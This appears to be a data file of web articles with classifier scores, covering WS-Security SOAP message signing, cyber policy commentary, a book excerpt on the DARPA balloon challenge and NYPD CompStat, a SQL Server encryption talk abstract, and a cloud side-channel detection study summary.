Ued923rza7fvdRG2CDalbW0R3aPd5q0u3akP0/Ejb7z5o88heajCSgfRruvU+ZdOTT3Oe+RBQgw8 45. VuzbLApPnXiehowYuA== 46. </X509Certificate> 47. </X509Data> 48. </KeyInfo> 49. </Signature> 50. </wsse:Security> 51. </soapenv:Header> 52. <soapenv:Body> 53. application specific data/content 54. </soapenv:Body> 55. </soapenv:Envelope>: Let's look at the SOAP message in greater detail. As you can plainly see, this is a typical SOAP message with an outermost opening and closing <soapenv:Envelope> tag set. The SOAP envelope contains <soapenv:Body> sections. The WS-Security section, as defined by the WS-Security specification, is positioned within the SOAP Header and is designated by the opening and closing <wsse:Security> block, lines 3-51. The <Security> header block provides a mechanism for attaching security-related information targeted at a specific receiver (the SOAP actor). Since only one SOAP actor is involved in this use case, only one <Security> header block is contained in the message. In line 3, the SOAP actor attribute defines the recipient of a header entry, Security soapenv:actor=\"http://www.jStartcustomer.com/actors#verifier\". Line 3 also contains the soapenv:mustUnderstand=\"1\" attribute. By setting the SOAP mustUnderstand attribute to \"1\", we indicate that the service provider must process the SOAP header entry. As per the SOAP specification, since the attribute is set to \"1\", if the receiver cannot obey the semantics (as conveyed by the fully qualified name of the element) and process the message according to those semantics, the receiver MUST fail processing the message and generate a fault. <SignedInfo> </SignedInfo>, describes the signed content of the message. Note that as is customary with digital signature applications, a digest is used to facilitate faster processing. This is a standard industry practice and is done for performance reasons. The payload (the SOAP Body) of our SOAP message is quite long, and the process of applying a public key algorithm to the full message could significantly impact the performance of our web service. As such, a digest is used. A digest is a fixed length, short message whose digital signature can be quickly generated and verified. When the message is received, our web service digital signature verifier class (implemented as an Apache Axis plugable provider) will compute the digest and verify that the newly-computed digest matches the digest that was sent. Let's look at the elements that make up the Signed Content portion of the message. Line 5, <CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/>, identifies the canonicalization algorithm that is used to create a canonicalized form of the information being signed -- in this case, the digest. This step is needed because of the nature of XML documents and the programming tools that work with them. XML documents, in some cases, can have slight textual differences, yet be essentially the same logical document. Small variations in the way comments are represented or in the way an XML parser handles line delimiters when serializing/deserializing an XML data structure can create slightly different binary representations of the same content. If the algorithm that verifies the digital signature were to be run against a slightly different serialized version of the data, the result could be a fail when indeed it should be a pass. To avoid this problem, the document is first transformed into its canonicalized form through the use of a canonicalization algorithm. This algorithm, an implementation of the W3C Exclusive XML Canonicalization Version 1.0 Specification (see Resources), a W3C recommendation, transforms the document into its basic canonicalized form. This allows us to get a consistent binary representation that can be correctly compared and thus yield the correct result. <SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"/>, indicates the Signature Method Algorithm. This is the algorithm that is used to convert the output of the canonicalization algorithm into the Signature Value. Our signature algorithm is a combination of a key dependent algorithm (RSA) and a hash algorithm (SHA1). This algorithm is an implementation of the RSASSA-PKCS1-v1_5 specification described in W3C RFC 2437 (see Resources). <Reference URI=\"#sign_content_1043176028580\">, indicates the reference element. The optional URI attribute of Reference identifies the data object that was signed. The Reference block includes the algorithm that is used to compute the digest, the digest value that was computed, and the final transform that is performed prior to computing the digest value. Lines 8-10, <Transforms> <Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/> </Transforms>, indicate the transformation algorithm, while lines 11 and 12 specify the digest algorithm and the computed digest value, In our application, the Transform algorithm is once again the W3C Exclusive XML Canonicalization algorithm discussed above. The method used to compute the digest, the Secure Hash Algorithm, is part of the U.S. Department of Commerce/National Institute of Standards and Technology's Secure Hash standard. <SignatureValue>kGlrrXjKku/WXKxID+JJkEXY+aGNYHc5dy8GwbLFtB5Msll2/MhwdnO9wastJ0gLPzLy3oHL, contain the signature value, which is actually the encrypted digest value. This value is the output of the Signature Method Algorithm indicated on line 6. Lines 20-48 introduce the concept of keys. A key is used to mathematically transform a normal, readable text message into an unreadable one for transmission across the internet. Our web service will use a public/private-key (a pair of mathematically related keys) or an asymmetric key encryption scheme. One of these keys is kept secret; this is the private key. In our application, the web service requester will sign the digest with his private key prior to sending the document to the service provider. Line 20 begins the Key Value block and identifies the namespace that we will use -- <KeyInfo xmlns=\"http://www.w3.org/2000/09/xmldsig#\">. The Key Value block, <KeyValue> <RSAKeyValue> </RSAKeyValue> </KeyValue>, is where the web service requester supplies the web service provider with the information they need in order to obtain the key needed to validate the signature. In our message, the KeyValue element contains the requester's public key, which will be used to validate the signature. We have chosen to use an asymmetric RSA (named after the three inventors, Rivest, Shamir, and Adleman) key-based approach in order to meet our non-repudiation requirement. The use of the RSA key scheme assures our web service provider that the message was in the same form that it was received, and it was signed by the owner of the extracted digital certificate. If the recomputed digest matches the decrypted digest from the SOAP message, the service provider is able to verify the integrity of the message. By logging the message before any processing is done (the log is implemented as the first Apache Axis handler in the handler chain), the web service provider can prove that the message in question was sent by whomever signed the message and that it was received unmodified from the form in which is was sent. RSAKeyValue elements have two fields: <Modulus> 2sW+eBjx5D2QMyr8ocZIZWNYHGf9zYhB4XWILPCTvhNV7dIe3l8ARepOA1ABFK2OMy pzb+Rb+nWQeo//yFz/28PmL63kdLiE72qmmQuzuPa5NXaV9pJ4JKw86QdLhGGpFIRH 18Iugf3xLFwQEZqKYnblTUs7ftnTgW5r4HH492k=</Modulus> The RSA scheme uses large prime numbers to construct the key pairs. The Modulus is the product of two large prime numbers. Each pair shares the Modulus, but each also has a specific exponent. The RSA Laboratories' Frequently Asked Questions About Today's Cryptography, Version 4.1 document (see Resources) describes how the Modulus and the Exponent are created: \"Take two large primes, p and q, and compute their product n = pq; n is the modulus. Choose a number, e, less than n and relatively prime to (p - 1)(q - 1), which means that e and (p - 1)(q - 1) have no common factors except 1. Find another number d such that (ed - 1) is divisible by (p - 1)(q - 1). The values e and d are called the public and private exponents, respectively. The public key is the pair (n, e); the private key is (n, d).\" The service requester digitally signs the message with their private key. On the service provider side, the signature is verified using the requester's public key. Since the service requester signs the message with a private, asymmetric key, the service provider is assured that the only organization that could have signed the message is the holder of the private key. The next section of the Key Info block is the digital certificate itself as indicated by the <X509Data> element. The digital certificate is used to identify the sender of the message in the way a user ID is used to identify the user of web and enterprise applications. The first element in this block of data identifies the organization that signed the certificate. This is typically the certificate authority. In our case, that information has been replaced with generic information: Next is the <X509SubjectName>CN=John Doe</X509SubjectName> element, which contains the distinguished name of the service requester -- in our case, simply John Doe -- and finally the X.509 certificate itself: <X509Certificate> MIIB0TCCAToCAQAwDQYJKoZIhvcNAQEEBQAwTzELMAkGA1UEBhMCVVMxETAPBgNVBAgTCE9rbGFo b21hMRAwDgYDVQQHEwdVbmsam3duMQwwCgYDVQQKEwNJQk0xDTALBgNVBAsTBEphdmEwHhcNMDIw OTI1MTAxMTQ4WhcNMDMwOTI1MTAxMTQ4WjATMREwDwYDVQQDEwhKb2huIERvZTCBnzANBgkqhkiG 9w0BAQEFAAOBjQAwgYkCgYEA2sW+eBjx5D2QMyr8ocZIZWNYHGf9zYhB4XWILPCTvhNV7dIe3l8A RepOA1ABFK2OMypzb+Rb+nWQeo//yFz/28PmL63kdLiE72qmmQuzuPa5NXaV9pJ4JKw86QdLhGGp FIRH18Iugf3xLFwQEZqKYnblTUs7ftnTgW5r4HH492kCAwEAATANBgkqhkiG9w0BAQQFAAOBgQCs OD02WMoYcMR7Sqdb9oQyk7Nn4rQ5DBgZ5mxGGVzWxBZW/QON+Ir2j4KUjX1jalMvbHa9lnhPQmJi Ued923rza7fvdRG2CDalbW0R3aPd5q0u3akP0/Ejb7z5o88heajCSgfRruvU+ZdOTT3Oe+RBQgw8 VuzbLApPnXiehowYuA== </X509Certificate> The final stage of WS-Security processing is to validate the web service requester's digital certificate. When using a digital certificate approach, each web service requester must have a digital certificate which a trusted Certificate Authority (CA) has signed. The definition of a trusted certificate authority is outside the scope of this paper, but typically either an industry-accepted, 3rd-party certificate authority (a company like VeriSign) performs this role, or the web service provider takes on the role of the certificate authority for the certificates that their application uses. If the latter approach is used, use of the open source OpenSSL toolkit from Apache, or the basic digital certificate support provided by WebSphere Application Server's IKEYMAN utility is recommended. In the initial rollout of our application, our customer chose to play the role of certificate authority. As such, they created their own, self-signed CA certificate. Prior to any web service interactions, the web service requester must provide the web service provider with a certificate that they will use in the application. Playing the certificate authority role, the web service provider signs the certificate and returns it to the web service requester. As described above, the web service requester includes the CA-signed digital certificate in the SOAP message. After the digital signature has verified the integrity of the message, the certificate is extracted from the message and validated using the CA's public key. Once the validity of the certificate has been achieved, the web service requester will have been authenticated and the processing of the WS-Security portion of the message will be complete. The owner has successfully authenticated to the receiver. Note that if, at a later date, our service provider chooses to relinquish the role of the certificate authority and use an industry-accepted, trusted, 3rd-party certificate authority, the logic of our validation code does not need to change. In this scenario, prior to using the web service, the web service requester will need to get a certificate issued by a trusted certificate authority. The service requester will place this 3rd-party certificate in the SOAP message. When the service provider is validating the digital certificate, instead of using their self-signed CA key, the public key of the 3rd-party CA will be used. In this scenario, the service provider has established a trust relationship with the 3rd-party certificate authority, and the CA will be trusted to adequately authenticate users before issuing certificates to them. One of the promises of web services is to be able to loosely couple the end points and allow the publishing of services in UDDI directories that can be discovered and invoked dynamically at run time. Unfortunately, at this point in the technology life cycle, the use of WS-Security in the SOAP message header prevents us from being able to do this. Today's Java to WSDL emitters are not yet able to handle the creation of WSDL documents that appropriately describe the WS-Security requirements. Plus, even if they could, at this stage, development tools such as WebSphere Studio Application Developer or Visual Studio .Net couldn't generate the proxies that handle the WS-Security aspects of the service. As such, the developers of web services in early 2003 will need to make a conscious trade-off here. When WS-Security is used, the service provider needs to either provide stubs/proxies which partners can invoke that handle the WS-Security portion of the message or manually communicate the WS-Security requirement of the Web service to their potential business partners and customers. For the WS-Security-based project described in this paper, proxies that properly sign the message and insert the WS-Security element into the SOAP data stream were created for Java technology, COM, and .Net clients. The next generation of Web services development tools from IBM and others should be able to handle the WS-Security elements of a Web service, but for now, developers need to understand that this is an achievable, but manual process. This paper described an Internet-based web services application that was developed and deployed in 2002. It was deployed on a WebSphere Application Server and is available for use by our customer's business partners. It demonstrates the soundness and overall viability of the draft WS-Security specification by offering itself as a proof-point that secure, mission critical, web services applications are viable with today's development tools and deployment platforms. Yes, in our customer's case, some non-automated, manual steps were required to handle the WS-Security element of our SOAP message, but as support for WS-Security gets folded into the next iteration of the WSDL specification and support is added to the web services development tools of many vendors, it will only get better. - Find the W3C Exclusive XML Canonicalization Version 1.0 Specification from the W3C web site. - Find the W3C XML Signature Syntax and Processing Proposed Recommendation Specification from the W3C web site. - Find the RFC 2437 (PKCS1) from the W3C web site. - Download the Secure Hash Standard (PDF) from the Department of Commerce/National Institute of Standards and Technology. - Browse through the RSA Laboratories' Frequently Asked Questions About Today's Cryptography, Version 4.1, Year: 2000. - Find more information about the IBM jStart Program. - You can find the Draft WS-Security Specification V1.0 on the developerWorks web services zone (5 April 2002). Sam Thompson joined IBM in 1980 and held various technical and management positions in VM product development. In 1992, Sam moved to the systems management development lab in Raleigh, North Carolina and helped bring several SystemView products to market. When SystemView merged with Tivoli Systems, Sam traveled the world as a technical evangelist explaining the merger, the new Tivoli strategy and products, and the convergence strategy for the IBM and Tivoli workgroup products. In March 1997 he assumed his present position in IBM's Emerging Technologies jStart (jump start) group and works with organizations to help them build solutions that utilize IBM XML, Java, and Web services technologies. You can reach Sam at thompsam at us.ibm.com.",
        "prob": "tensor([[2.0439e-06, 1.0000e+00]])"
    },
    {
        "text": "Cyberattacks: A call for collaborative action We need to develop a collective consciousness for coping with the growing menace of cyber attacks, says Stanton Sloane. News of cyber security attacks is becoming all too familiar. Recent reports propose how to combat sophisticated, custom-created malware designed to penetrate government and private industry computer networks, and steal national security secrets. This has raised overall awareness of the problem, but not as much attention has been placed on a key business concern: the theft of commercial intellectual property. We need to develop a collective consciousness for coping with the growing menace of cyber attacks, particularly given the economic and safety issues triggered when valuable intellectual property is the target. That's why advocating a public-private industry collaboration makes the most sense. The isolated efforts of individual nations, industry groups, or companies will be ineffective against 21st century intellectual property crime. This is a bigger problem. A few examples illustrate the point: - According to the Office of the United States Trade Representative (USTR), intellectual property theft costs American corporations $250 billion every year. Among those affected are manufacturers, distributors, retailers, employees, artists, consumers, and governments. - The costs of intellectual property theft are not solely economic; the public's health and safety is also affected. For instance, intellectual property thieves can make huge profits from selling cheap counterfeit versions of products, not only where safety and reliability are essential, but also when brand recognition is key to consumer confidence and loyalty. One example: counterfeit airplane parts played a role in at least 166 U.S.-based accidents or mishaps during a recent 20-year period. - United States Customs and Border Protection estimates that 750,000 American jobs have been lost due to counterfeiting. - The U.S. Chamber of Commerce Global Intellectual Property Center estimates that intellectual property in the United States is worth between $5 trillion and $5.5 trillion. It accounts for approximately half of U.S. exports with roughly 40 percent driving U.S. economic growth. The impact of intellectual property theft on the U.S. economy is irrefutable. - Research from the non-profit U.S. Cyber Consequences Unit indicates that the destruction from a single wave of cyber attacks on critical infrastructure could exceed $700 billion, or the equivalent of 50 major hurricanes hitting U.S. soil at once. Beyond the economic impacts, theft of intellectual property provides a significant advantage in learning curve for the thief. My hypothetical example would be the time involved in developing manufacturing techniques to produce advanced jet engine components. Theft of the processes, techniques, and tools required to produce these components instantly provides the thief with years of experience, and quickly levels the competitive landscape. This is not a new problem. But when we move from the realm of music “pirates” or theft of soft drink formulations into organized, state-led thefts of critical technologies, the threat to national security increases exponentially, even though it is not a direct attack on our defense networks. There is no simple solution to this problem. The first step, however, must be recognition of the scale and scope of the problem. It is underestimated today. Given the impact an average hacker can create with a simple virus, you can appreciate what a well-financed foreign government-sponsored intelligence organization can do to penetrate a commercial company's network and extract critical intellectual information. Simple virus detection software is not an adequate defense against that type of threat. It is a complex system engineering problem, one which requires a collective government-industry collaboration to counter. There also needs to be consequences for nations that conduct these activities, or who fail to pursue and prosecute criminals operating within their borders. Granted, that is a hard problem to solve in an age of globalization where international relations are very sensitive, but the alternative is an accelerating shift of technology and financial power out of this country. While current political rhetoric makes us feel good about increasing the country's investment in research and technology, it is pointless to do so if it is just going to be pirated by our foreign adversaries. We are simply saving them the time and money of doing it themselves. The time for action is now. A “Cyber Pearl Harbor” is in reality an “Economic Pearl Harbor.” The only difference is that the enemy has quietly opened all the underwater valves on the ships, instead of dropping torpedoes. Dr. Stanton Sloane was appointed president and CEO of SRA International in April 2007.",
        "prob": "tensor([[2.0814e-06, 1.0000e+00]])"
    },
    {
        "text": "For the last year or so, business managers have been pounded with the rallying cry to protect their data and controls from possible cyber crime. Now, several Information Technology experts are asking the question: Has the threat of cyberterrorism been overstated? At the recent CeBIT show, a panel of IT experts concluded that it has. The general consensus was that a bomb would strike more terror into a people or country than a temporary shutdown of the Internet. The Internet is great for communication, and terrorists are probably using it for such purposes. But the idea that a shutdown of the Internet would frighten people, in the U.S. for example, into widespread panic has less credibility, said the experts. According to the panel, which included executives from software security vendors and representatives from NATO, most critical systems don’t run on the Internet. They run on secure networks, making it far less likely that terrorist hackers would get in. (If you’re like most businesses, you too have an independent site that accesses the Internet, but doesn’t completely and solely rely on it.) One reason for all the focus on the possibility of cyberterrorism, claimed those experts, is that the U.S. government wanted a broader front to use in its attack on terrorism. Companies and others willingly jumped on that bandwagon, touting the benefits of making sure your controls and systems are secure and safe. This is not to say that cyber attacks won’t happen. Recent news reports show that communication and computer attacks are happening. For example, Al-Jazeera, the Arab satellite television network, experienced denial of service attacks shortly after it showed U.S. solders held as POWs by Iraq, and for a few weeks afterward. The attacks pretty much shut down the network during the last few weeks of this past March. In another high-profile example, the Web site for 10 Downing Street also experienced problems; it was hacked by antiwar protesters. While the risk of a catastrophic cyber terrorist attack may be more realistically viewed as low, that doesn’t mean we shouldn’t protect our controls and systems. After all, the threat of viruses and worms continues. According to a survey conducted by ICSA Labs, a division of TruSecure Corp., the number of virus attacks is down, but the ones that occur are more virulent. The survey analyzed incidents reported on more than 900,000 desktop computers, servers and gateways. Based on the analysis, for every 1,000 machines operating, there are about 113 virus attacks a month. That number is not an indication that the problem is going away. The ICSA Labs noted that it takes about 23 staff days to clean up systems after an attack, at an average cost of about $81,000. The next areas you may want to secure and protect are your domain name and dot-com servers. And experts are thinking that the next attacks from hackers will involve forgery and identity theft more than denial of service or viruses. Therefore, while we will probably not face many of the more exaggerated scenarios of business catastrophe due to cyber crime, there are worthwhile reasons to protect your controls and systems. The good news is that you have some breathing space. Make sure your firewalls are properly configured and that you routinely install patches and fixes as software vendors announce them, That will go a long way toward preventing a cyber attack. As budgets permit, you can install more rugged and secure solutions. But there is more good news on the cyber crime front. Colleges and universities are finally taking steps to teach future programmers how to write secure code and detect hacking. Microsoft Corporation is helping with this endeavor. The company is working with a number of universities to develop programming curriculua that teach students the skills necessary to handle these issues. In some of the courses, students will be asked to hack into code, (which in a slightly warped way could mean that we are training future hackers). Nonetheless, it’s a good idea to train programmers in how to deal with these problems. By the way, these university programs will cover a range of software code, not just Microsoft code. On the whole, industry’s efforts to fight cyber crime make good news. Leslie Langnau, senior technical editor email@example.com",
        "prob": "tensor([[2.0600e-06, 1.0000e+00]])"
    },
    {
        "text": "The Case for Collaboration THE HUNT FOR TEN RED BALLOONS On October 29, 2009, the Defense Advanced Research Projects Agency (DARPA) announced its \"Network Challenge.\" At 10:00 a.m. on December 5, 2009, at ten locations throughout the United States, DARPA would let fly an eight-foot-diameter red weather balloon tethered to the ground. Each balloon would be readily visible from local roads and buildings--points the average person could reach. A $40,000 prize would go to the first team to accurately report the location of all ten weather balloons. The contest was meant to replicate the challenge of trying to gather information about an adversary in an open environment. DARPA wanted to test whether ordinary folks using commonly available off-the-shelf technology and social media like Twitter or Facebook could work together--collaborate--to solve a problem that would be, in the words of one expert from the National Geospatial-Intelligence Agency, \"impossible to solve by traditional intelligence gathering methods.\" A team from MIT's Media Lab won. No surprise there. MIT had a slew of faculty and top graduate students, the most sophisticated equipment, and great publicity. CNN profiled them and drew attention to their cause. A Georgia Tech team placed second, for similar reasons. Both teams competed fiercely. They put out misinformation, reporting false sightings, sent others on wild-goose chases, and bought time for themselves. Both teams wrote complex computer programs to defend themselves against such attacks. Given their advantages, you would expect MIT and Georgia Tech to come out ahead--and they did, with a winning time under nine hours. But what is interesting is the guy who finished in a tie for third with eight balloons, and actually led the pack for the first four hours of the competition--nineteen-year-old hacker George Hotz. Hotz heard about the contest only a couple of days before, and only an hour before it started he put up a website called Dudeitsaballoon.com. How did he do it? His idea was based on a kind of mass collaboration. Hotz had nearly fifty thousand followers on Twitter. They, in turn, had hundreds of thousands of followers. His plan was to mobilize them all--get thousands in the game and all those eyeballs searching for the prized red balloons. It almost worked. Hotz was already famous in the hacker community for \"jailbreaking\" the Sony PlayStation and the Apple iPhone. He'd cracked their proprietary codes, and for the iPhone wrote software that let iPhone owners use it on any wireless network, not just AT&T's--much to AT&T's and Apple's chagrin and the hacker community's glee. These legendary hacks made Hotz a star. He gained tens of thousands of Twitter followers, all of whom wanted to be the first to know what George Hotz might do next. On Twitter, they would soon find out. On the day before the DARPA contest, Hotz--who went by his Twitter name, @geohot--tweeted his followers to stand by for a major announcement the next day. That started a buzz going in the Twitterverse and on hacker bulletin boards. On Saturday morning @geohot tweeted his fifty thousand followers: 10AM EST today marks the start of a US wide scavenger hunt, for 10 red balloons http://bit.ly/7chum5 #dudeitsaballoon He quickly followed up with another tweet: So I need your help to do two things, 1, find big red balloons, and 2, RT [retweet] and trend this !!!! http://bit.ly/7chum5 #dudeitsaballoon He included a link to his website. The hashtagged #dudeitsaballoon guaranteed that if his message got retweeted, as requested, #dudeitsaballoon would rise to the top of the Twitter trending terms. That would amplify its effect--and call further attention to Hotz's cause. Visitors clicking through to Hotz's website found the following message: Right now you are all probably waking up to another normal Saturday. But this Saturday is not normal. In addition to planes, birds, owls, and everything else in the sky, there are 10 red balloons scattered around the United States. Starting at 10AM EST, your US government is using tax dollars to send 10 big red weather balloons into the sky. I need to know the location of those balloons. So if you see a big red balloon in the sky, about 8ft round, numbered 1 to 10 . . . report it here ASAP so I can win the contest. Hotz offered $1,000 to anyone who gave him a confirmed sighting. And he offered something that would incite any die-hard hacker. \"Seriously,\" Hotz wrote. \"If you guys come through for me . . . I'll make you an untethered jailbreak.\" Offering an untethered jailbreak to the hacker community was like dangling red meat in front of a lion. It was the gold standard of all hacks. Unlike Hotz's earlier iPhone hack, which left the iPhone tethered to software you had to run each time you started the phone, this time Hotz was promising to hack the iPhone again and create an untethered jailbreak. Untethered, you could use your phone just like any cell phone, on any carrier. Untethered, the iPhone would be released from its earthly moorings. It would be hacker heaven. Word raced around hacker online sites and bulletin boards that George Hotz was offering to do an untethered jailbreak for spotting the red balloons. We have to win this, the hacker community buzzed. Do it for @geohot; do it for us! By hour four, Hotz had four verified sightings--more than the MIT team and the Georgia Tech team. He traded two of his four sightings with one of the other front-running teams. That made six. Eventually, the MIT and Georgia Tech teams surged ahead, but not before Hotz found eight of the ten balloons. He had done better than dozens of teams competing. It was far more than what traditional intelligence gathering could accomplish. More than that, it showed DARPA the raw power of the Internet to foster collaboration. What George Hotz lacked in funding, institutional support, and educational credentials he made up for with digital age assets: networks of followers who, on an otherwise ordinary Saturday and with a promise of glory and gifts, he could get in the game fast. Already arrayed on trusted platforms, Hotz sent current through those networks, turned followers into partisans, and got them collaborating--in minutes. Together, they pulled off something extraordinary (and nearly won the Challenge). RESTORING AN EMPIRE STATE OF MIND BILL BRATTON Takes New York As the commissioner of the New York City Police Department and the Boston Police Department, and chief of the Los Angeles Police Department, I learned about the power of collaboration across departments, agencies, and private industry early on. In 1993, an army of squeegee people seemed to have taken over New York. At every corner and tunnel entrance in the city, you'd stop for a light and they would pounce, some filthy rag or sponge coming up to your windshield, a face and hand close behind. You could try to wave them off. Or you could try to ignore them, eyes straight ahead. Not always practical. It was sort of a mini-street corner protection racket, with the convenient charade of a spit-enhanced wipe down and a key scratch across your car's paint job if you didn't pay them for the \"cleaning.\" In 1993, the election for New York City mayor was on. US Attorney Rudy Giuliani was running against Mayor David Dinkins, crime, disorder--and squeegee people. You could almost make a compound noun of those terms, lumping them all together, and many voters did. The news stories were incessant, fueling what every New Yorker sensed anyway, whether they commuted by car, foot, or subway: the city was out of control. Ten percent of New Yorkers experienced violent crime in a year. But every day 100 percent experienced the city's disorder: fare beaters and drunks on the subways, mental patients off their meds wandering the streets, prostitution operating out in the open. Long lines, high taxes, poor service. Broken neighborhoods, broken people, broken windows--a broken city. It all fueled a sense of chaos. The New York Post summed it up for the incumbent, Mayor Dinkins: \"Dave, Do Something!\" Too late for his mayoralty, Dinkins raised money for six thousand more cops. Too often, NYPD commissioner Ray Kelly's cops scattered the squeegee people only to see them rally to some other corner moments later. When the dust of the November elections settled, the voters had replaced Dinkins with Giuliani; the new mayor soon replaced Kelly with me as NYPD commissioner. I had been the commissioner of the Boston Police Department and before that, in 1991, chief of the New York City Transit Police Department. Giuliani had made a campaign promise to get rid of the squeegee guys, so I knew I needed to move quickly, continuing the work Kelly had begun. Counting heads, it turned out that the \"army\" of squeegee men had actually numbered about seventy-five. Well before the Internet, the blogosphere, or the Twitterverse, New York's potent tabloids had turned seventy-five sponge-and-bucket guys into a national symbol of impotent government and a city on the brink. Persistent police work paid off. Many of the men had had prior problems with the law and couldn't afford to get arrested again. Which is exactly what we promised, and did. We stayed around long enough to break up this thriving little extortion racket that was driving the city crazy. Seemingly overnight the squeegee men were gone--though we did have in our favor thirty-eight thousand cops versus seventy-five squeegee pests. The tactics I used to conquer that problem formed the strategy of what I hoped would be a much more ambitious effort, one aimed not just at cutting crime but at dramatically changing the quality of life in New York. The NYPD had people bluffed, as I later wrote in my first book looking back at the time. They had the reputation as the greatest crime-fighting machine in the history of policing, but to me the big blue wall was a lot of blue smoke and a few mirrors. They were good at responding to crime, they just weren't very good at preventing it. They weren't even trying to prevent it. They were just cleaning up around it. The NYPD, like many departments, was \"all response, all the time.\" The 911 dispatch system created in the 1970s had democratized policing: it was no longer \"who you knew downtown.\" Now, any citizen could mobilize the department with a free call from a pay phone. And millions did. Police were racing across the city from call to call. But the 911 system didn't dent crime much--the onslaught of crack, disorder, and guns in the 1980s and '90s saw to that. A single citizen could make hundreds--even thousands--of calls complaining about nuisance gangs, drugs, and prostitutes on the same corner. Officers responded every time, but nothing changed. It was like shoveling sand against the tide--the tide kept coming back. Remember the precinct house nicknames of the time--\"Fort Apache, the Bronx\" or \"Little House on the Prairie\"? That's what American policing had become: isolated outposts, controlling little outside its four walls--or outside the cruiser. The 911 dispatch kept cops in cars, windows rolled up, AC blasting, racing to calls or on \"random\" patrol in between, intending to deter crime by their mere presence. As New York City's police commissioner, I quickly set out to establish a new form of policing, one that required collaboration not only between all areas of the department, but also with other agencies and the public. My goal was to transform the city and the American police profession. It all starts with a vision, I told the department: as good as we are, we can do better. But we can't do it alone. The path forward--the new platform for policing New York--came to be known as CompStat. \"When have you guys ever addressed crime?\" Jack Maple, my right hand at the New York Transit Police Department and now at the NYPD, was digging in. John Timoney, a twenty-five-year NYPD veteran and now my chief of department, had called Maple out for his comment to a reporter. \"Those guys over there at the NYPD have given up on crime fighting,\" Maple had said. Timoney pointed to this operation and that, and cited his stellar service as commander of New York's 5th Precinct on the Lower East Side. Maple would have none of it. \"Your Narcotics Bureau works nine to five, Monday through Friday. The Warrant squad is off weekends. Auto crimes, off weekends. Robbery squad, off weekends. The whole place takes weekends and nights--just when the criminal element gets down to work.\" And that was the problem. To transform the city, I knew, my team and I would have to start with the NYPD. To succeed, I needed believers and doers. I screened the incoming command staff and promoted my own leaders over the heads of others--Timoney among them, and Louis Anemone, who would be chief of patrol. My inner staff was made up of longtime NYPD partisans--but commanders who were loyal to me, who understood and bought into my vision: the NYPD could do better, and this was the way. Maple had been through this before with me when years earlier I reorganized the New York Transit Police Department. Metropolitan Transit Authority president David Gunn had told me at the time that fare beating was bleeding the MTA dry; disorder was shrinking ridership. There was brand-new capital waiting to be poured into rebuilding the subways--but the subways were out of control. He needed them tamed. I concentrated patrols where the problem was highest, and ran high-visibility mass arrests. We were able to bring fare beating on the subways down from 170,000 per day to the point where it fell so low that the MTA stopped tracking it. Malcolm Gladwell wrote about this \"tipping point\" phenomenon in his book of the same name. But I also learned something that stuck with me: many fare beaters tend to have character flaws. One in seven was wanted on a warrant or probation and parole violation. One in twenty-one carried an illegal weapon. And that got the cops going: an arrest for fare beating wasn't just about writing a paper summons anymore. Now it was about making felony collars. And when fare beating went away, crime fell, and so, too, did the sense of disorder. And when it did, ridership returned. The MTA coffers began to fill again; the capital plan could go forward. That was the idea. Take care of the small stuff, shake the tree for information, and you head off the big stuff. Take a fare beater or a low-level drug dealer off the street, and whatever criminal behavior he had in mind goes away with him. You can control behavior to such an extent that you can change it. That was the broken windows theory in practice.1 1 The \"broken windows\" theory was articulated by George L. Kelling and James Q. Wilson in the March 1982 issue of The Atlantic: \"Broken Windows: The Police and Neighborhood Policing.\" Excerpted from Collaborate or Perish! by William J. Bratton and Zachary Tumin. Copyright © 2012 by William Bratton. Excerpted by permission of Crown Business, a division of Random House, Inc. All rights reserved. No part of this excerpt may be reproduced or reprinted without permission in writing from the publisher.",
        "prob": "tensor([[3.7444e-06, 1.0000e+00]])"
    },
    {
        "text": "Working with encrypted data in SQL Server Encryption plays an important role in protecting data and preventing intrusion. In this session we will look at the various places and methods of Encryption that exist inside SQL Server. First, we will look at the types of encryption available in SQL Server. These include Encryption by Pass Phrase, by Symmetric key, by Asymmetric key, by Certificate, by one-way-Hash and signing. During this we will be looking at the strength of the encryption and possible attacks such as whole-value substitution, brute force and Rainbow table attack. Lastly, we will look at how SQL encryption differs from .Net (or other programming environments) and the pros and cons of each. Following on from that will be a look at how the encryption hierarchy works to provide an impressive level of key protection. We will be answering questions like what is a master key, how it is different to the service master key, and what does the service master key do. We will be looking at System level encryption for system features such as TDS and credentials storage and services such as SSRS, SSIS, and DQS. How and why do these services use encryption? These features and services use SQL encryption inherently to protect the most sensitive of configuration Finally, we will look at ways of preparing for disaster recovery with encrypted data. Encrypted data is nothing more than random binary data with the keys and algorithms to decrypt it. Thus, there is a critical need for effective key management and understanding of what is necessary to recover encrypted data in the event of a disaster. Sorry, there are no downloads available for this session. I’m a talented multi-skilled IT professional with advanced skills in SQL server 2005/08 and 2012. I have many years experience in SQL design, administration, server consolidation and migration in large scale organisations. I have completed MCITP in database administration and development. My belief is that data is the critical element of an organisation and that a database must be effective, efficient and secure. I am an expert in information system holding a BSc(Hons) in computing and informatics. I currently work for an international organisation as their head DBA. My next aim is completion of MCSM and to discuss a topic at SQLBits. The video is not available to view online. - Session Files Explorer The network name cannot be found.",
        "prob": "tensor([[3.0490e-06, 1.0000e+00]])"
    },
    {
        "text": "Tightly wound: A cross-section of a new cable design shows superconducting ribbons wound around a core of copper wires. Source: “Home Alone: Co-Residency Detection in the Cloud via Side-Channel Analysis” Yinqian Zhang et al. Proceedings of the IEEE Symposium on Security and Privacy, May 2011 Results: A prototype system allows companies that use cloud computing services to confirm that their data is safe from others using the same service provider. It can detect with 80 percent accuracy the presence of unauthorized processing on the same server; the rate of false positives is 1 percent. The system will notice both attackers and inappropriate data sharing. Why it matters: Cloud computing makes it possible to access generic processing and storage resources over the Internet. But security concerns have made many companies and organizations hesitant to use these services. Data could be stored on hardware shared with competitors, they fear, or it could even be vulnerable to malicious software actively trying to steal information. Some customers, such as NASA, have demanded that cloud providers physically isolate their data from that of other users. The problem is that until now, it’s been almost impossible to verify that this is being done. Methods: In the past, researchers have found that attackers can steal data about a virtual machine’s activities—even sensitive information such as passwords—by watching subtle clues such as how it uses shared system resources, including the server’s temporary storage system. The researchers coöpted this principle to make it work for defense. They trained a legitimate virtual machine to watch a server’s cache for telltale signs of hostile virtual machines on the same server. The technique requires no modification to existing cloud technologies and no action from the cloud provider. Next Steps: The researchers are expanding the prototype to create a complete system that can run on a commercial cloud service, such as Amazon Web 